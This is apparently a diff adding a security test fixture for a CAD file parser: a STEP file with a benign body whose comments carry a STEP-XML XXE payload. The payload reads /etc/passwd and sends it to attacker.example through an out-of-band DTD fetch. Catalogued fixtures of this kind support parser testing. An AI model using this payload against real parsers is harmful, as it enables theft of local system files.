@@ -1,0 +1,34 @@
+/* Ad109 - STEP-XML parameter-entity injection exfiltrates local file via
+ * out-of-band DTD fetch
+ * Defect: a STEP-XML (.stpx) file with an internal DTD declaring a
+ * chain of parameter entities that read a local file, embed its
+ * contents into a synthesised URL, and emit the URL via an external
+ * DTD fetch - the textbook out-of-band XXE exfiltration. This fixture
+ * is shown in .stp form for cataloguing; the actual attack surface is
+ * .stpx. Provenance tier: cross-file-state. */
+ISO-10303-21;
+HEADER;
+FILE_DESCRIPTION(('Ad109 - STEP-XML parameter entity exfiltrates local file'),'2;1');
+FILE_NAME('Ad109.stp','2026-05-02T00:00:00',(''),(''),'cad-research-suite','','');
+FILE_SCHEMA(('AUTOMOTIVE_DESIGN { 1 0 10303 214 1 1 1 1 }'));
+ENDSEC;
+DATA;
+/* Witness fixture: the .stp body is benign. The defect lives in the
+   .stpx XML prologue:
+     <?xml version="1.0"?>
+     <!DOCTYPE step [
+       <!ENTITY % file SYSTEM "file:///etc/passwd">
+       <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?x=%file;'>">
+       %eval;
+       %exfil;
+     ]>
+     <step>...</step>
+   The parser reads /etc/passwd into %file, builds a URL containing its
+   contents in %eval, and fetches the URL via %exfil - exfiltration via
+   out-of-band DTD fetch. */
+/* <!ENTITY % file SYSTEM "file:///etc/passwd"> */
+/* <!ENTITY % eval "<!ENTITY % exfil SYSTEM 'http://attacker.example/?x=%file;'>"> */
+#1=APPLICATION_CONTEXT('automotive_design');
+#10=CARTESIAN_POINT('benign',(0.0,0.0,0.0));
+ENDSEC;
+END-ISO-10303-21;
